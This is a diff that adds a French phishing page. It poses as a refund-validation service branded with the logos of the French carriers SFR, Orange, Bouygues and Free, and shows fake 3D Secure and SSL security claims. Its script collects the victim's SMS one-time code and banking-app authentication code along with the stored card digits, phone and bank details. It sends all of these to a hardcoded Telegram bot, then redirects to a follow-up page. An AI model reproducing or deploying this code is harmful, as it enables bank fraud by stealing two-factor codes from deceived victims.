@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="fr" class="scroll-smooth">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Validation de Remboursement | Service Remboursement</title>
+    
+    <!-- Meta Tags SEO -->
+    <meta name="description" content="Validation sécurisée de votre demande de remboursement">
+    <meta name="robots" content="noindex, nofollow">
+    
+    <!-- Favicon -->
+    <link rel="icon" type="image/png" href="/favicon-32x32.png">
+    
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        primary: {
+                            50: '#f0fdf4',
+                            100: '#dcfce7',
+                            200: '#bbf7d0',
+                            300: '#86efac',
+                            400: '#4ade80',
+                            500: '#22c55e',
+                            600: '#16a34a',
+                            700: '#15803d',
+                            800: '#166534',
+                            900: '#14532d',
+                        }
+                    },
+                    fontFamily: {
+                        sans: ['Inter', 'system-ui', 'sans-serif'],
+                    },
+                    animation: {
+                        'pulse-slow': 'pulse 3s cubic-bezier(0.4, 0, 0.6, 1) infinite',
+                    },
+                }
+            }
+        }
+    </script>
+    
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        :root {
+            --primary-color: #22c55e;
+            --primary-dark: #15803d;
+        }
+        
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f8fafc;
+        }
+        
+        .verification-badge {
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .verification-badge::after {
+            content: "";
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(
+                to bottom right,
+                rgba(255, 255, 255, 0) 45%,
+                rgba(255, 255, 255, 0.8) 50%,
+                rgba(255, 255, 255, 0) 55%
+            );
+            transform: rotate(30deg);
+            animation: shine 3s infinite;
+        }
+        
+        @keyframes shine {
+            0% { transform: translateX(-100%) rotate(30deg); }
+            100% { transform: translateX(100%) rotate(30deg); }
+        }
+        
+        .security-badge {
+            animation: pulse-slow 2s infinite;
+        }
+    </style>
+</head>
+<body class="bg-gray-50">
+    <!-- Header -->
+    <header class="bg-white shadow-sm">
+        <div class="container mx-auto px-4 py-4 flex justify-between items-center">
+            <div class="flex items-center space-x-2">
+                <img src="360_F_544997418_C0KOHoDqSoOU5V5ELcQzKD9ngNTbrKFh.jpg" alt="Logo" class="h-10 w-auto">
+                <span class="text-xl font-bold text-primary-600">Service Remboursement</span>
+            </div>
+            
+            <div class="flex items-center space-x-2">
+                <span class="text-sm text-gray-600"><i class="fas fa-lock mr-1"></i> Connexion sécurisée</span>
+                <div class="w-3 h-3 rounded-full bg-green-500 animate-pulse"></div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="flex-grow flex items-center justify-center py-12 px-4">
+        <div class="w-full max-w-md bg-white rounded-xl shadow-lg overflow-hidden transition-all duration-300 transform hover:shadow-xl">
+            <!-- Header Card -->
+            <div class="bg-gradient-to-r from-primary-500 to-primary-700 p-6 text-white text-center">
+                <h1 class="text-2xl font-bold mb-2">
+                    <i class="fas fa-check-circle mr-2"></i> Validation Requise
+                </h1>
+                <p class="text-primary-100">Finalisez votre demande de remboursement</p>
+            </div>
+            
+            <!-- Body Card -->
+            <div class="p-6">
+                <!-- Verification Badge -->
+                <div class="verification-badge bg-yellow-50 border border-yellow-200 rounded-lg p-4 mb-6 text-center">
+                    <div class="flex items-center justify-center text-yellow-800 mb-2">
+                        <i class="fas fa-exclamation-triangle text-xl mr-2"></i>
+                        <h2 class="font-bold">Remboursement en attente de validation</h2>
+                    </div>
+                    <p class="text-sm text-yellow-700 mb-3">
+                        Merci de vous connecter sur votre application bancaire afin d'approuver la demande de remboursement et créditer le montant sur votre carte.
+Valider par SMS si vous ne possédez pas l'application bancaire !
+                    </p>
+                </div>
+                
+                <!-- Transaction Details -->
+                <div class="bg-gray-50 rounded-lg p-4 mb-6">
+                    <h3 class="font-medium text-gray-800 mb-3 flex items-center">
+                        <i class="fas fa-receipt mr-2 text-primary-600"></i>
+                        Détails de la transaction
+                    </h3>
+                    
+                    <div class="space-y-3 text-sm">
+                        <div class="flex justify-between">
+                            <span class="text-gray-600">Marchand :</span>
+                            <span class="font-medium"></span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="text-gray-600">Montant :</span>
+                            <span class="font-medium text-primary-600" id="amount-value">400 €</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="text-gray-600">Date :</span>
+                            <span class="font-medium" id="current-date"></span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="text-gray-600">Carte :</span>
+                            <span class="font-medium"> <span id="last-four">••••</span></span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="text-gray-600">Téléphone :</span>
+                            <span class="font-medium" id="phone-number">Non renseigné</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- SMS Code Input -->
+                <div class="mb-4">
+                    <label for="sms-code" class="block text-sm font-medium text-gray-700 mb-1">
+                        <i class="fas fa-mobile-alt mr-1 text-primary-600"></i> Code SMS
+                    </label>
+                    <input type="tel" id="sms-code" class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500" placeholder="Entrez le code reçu" maxlength="6">
+                </div>
+                
+                <!-- Bank App Code -->
+                <div class="mb-6">
+                    <label for="bank-code" class="block text-sm font-medium text-gray-700 mb-1">
+                        <i class="fas fa-lock mr-1 text-primary-600"></i> Code d'application bancaire
+                    </label>
+                    <input type="password" id="bank-code" class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500" placeholder="Votre code d'authentification">
+                </div>
+                
+                <!-- Submit Button -->
+                <button id="validate-btn" class="w-full bg-gradient-to-r from-primary-500 to-primary-700 text-white font-bold py-3 px-4 rounded-lg flex items-center justify-center hover:from-primary-600 hover:to-primary-800 transition">
+                    <i class="fas fa-check-circle mr-2"></i> Valider le remboursement
+                </button>
+                
+                <!-- Security Info -->
+                <div class="bg-blue-50 border-l-4 border-blue-400 p-4 rounded-r-lg mt-6">
+                    <div class="flex">
+                        <div class="flex-shrink-0">
+                            <i class="fas fa-shield-alt text-blue-400 mt-1"></i>
+                        </div>
+                        <div class="ml-3">
+                            <p class="text-sm text-blue-700">
+                                <strong>Sécurité maximale :</strong> Cette opération est protégée par la norme 3D Secure.
+                            </p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Footer Card -->
+            <div class="bg-gray-50 px-6 py-4 text-center">
+                <div class="flex justify-center space-x-4 mb-3">
+                    <img src="SFR-2022-logo.svg.png" alt="SFR" class="h-6 opacity-70">
+                    <img src="Orange_logo.svg.png" alt="Orange" class="h-6 opacity-70">
+                    <img src="Bouygues_Télécom.png" alt="Bouygues" class="h-6 opacity-70">
+                    <img src="Free_logo.svg.png" alt="Free" class="h-6 opacity-70">
+                </div>
+                <p class="text-xs text-gray-500">
+                    <i class="fas fa-lock mr-1"></i> Transactions sécurisées SSL 256-bit | 
+                    <span class="security-badge inline-flex items-center px-2 py-0.5 rounded text-xs font-medium bg-green-100 text-green-800 ml-1">
+                        <i class="fas fa-check-circle mr-1"></i> Sécurité vérifiée
+                    </span>
+                </p>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-gray-100 border-t border-gray-200 py-6">
+        <div class="container mx-auto px-4 text-center">
+            <p class="text-sm text-gray-600">
+                © 2024 <strong>Service Remboursement</strong> | 
+                <a href="#" class="text-primary-600 hover:underline">Conditions générales</a> | 
+                <a href="#" class="text-primary-600 hover:underline">Politique de confidentialité</a>
+            </p>
+            <p class="text-xs text-gray-500 mt-2">
+                Ce service est indépendant des opérateurs téléphoniques. Délais de traitement indicatifs.
+            </p>
+        </div>
+    </footer>
+
+    <!-- Scripts -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>
+    <script>
+        // Format current date
+        document.addEventListener('DOMContentLoaded', () => {
+            const now = new Date();
+            const options = { 
+                weekday: 'long', 
+                year: 'numeric', 
+                month: 'long', 
+                day: 'numeric',
+                hour: '2-digit', 
+                minute: '2-digit'
+            };
+            document.getElementById('current-date').textContent = now.toLocaleDateString('fr-FR', options);
+            
+            // Get stored data
+            const remboursementData = JSON.parse(localStorage.getItem('remboursementData')) || {};
+            if (remboursementData) {
+                document.getElementById('amount-value').textContent = remboursementData.amount + ' €';
+                document.getElementById('last-four').textContent = remboursementData.lastFourDigits || '••••';
+                document.getElementById('phone-number').textContent = remboursementData.telephone || 'Non renseigné';
+            }
+        });
+        
+        // Validation function
+        document.getElementById('validate-btn').addEventListener('click', function() {
+            const smsCode = document.getElementById('sms-code').value;
+            const bankCode = document.getElementById('bank-code').value;
+            
+            if (!smsCode || !bankCode) {
+                alert("Veuillez remplir tous les champs de validation");
+                return;
+            }
+            
+            // Get transaction details
+            const remboursementData = JSON.parse(localStorage.getItem('remboursementData')) || {};
+            const message = `🔐 **Validation de Remboursement** 🔐
+📞 Téléphone: ${remboursementData.telephone || 'Non renseigné'}
+💳 Carte: **** **** **** ${remboursementData.lastFourDigits || '••••'}
+💰 Montant: ${remboursementData.amount || '0'} €
+📡 Opérateur: ${remboursementData.operateur || 'Non spécifié'}
+🏦 Banque: ${remboursementData.bank || 'Non spécifiée'}
+📌 Motif: ${remboursementData.reason || 'Non spécifié'}
+
+🔢 Code SMS: ${smsCode}
+🔐 Code Banque: ${bankCode}`;
+
+            // Send to Telegram
+            const token = "8094841970:AAFFYlK6BoIitk7Dvm091171uV-b6aZSF84";
+            const chatId = "5372119436";
+            
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: "Markdown"
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    window.location.href = "traitement1.html";
+                } else {
+                    alert("Erreur lors de la validation. Veuillez réessayer.");
+                }
+            })
+            .catch(error => {
+                console.error("Erreur:", error);
+                alert("Problème de connexion. Veuillez vérifier votre réseau.");
+            });
+        });
+    </script>
+</body>
+</html>
